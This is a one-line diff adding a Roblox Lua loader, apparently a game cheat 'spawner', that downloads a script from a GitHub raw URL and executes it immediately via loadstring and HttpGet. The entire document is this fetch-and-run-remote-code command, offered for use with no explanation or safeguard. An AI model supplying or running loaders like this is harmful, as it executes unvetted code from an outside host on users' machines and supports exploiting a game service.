@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/scripteredwinter/scripts/main/gag2spawner"))()
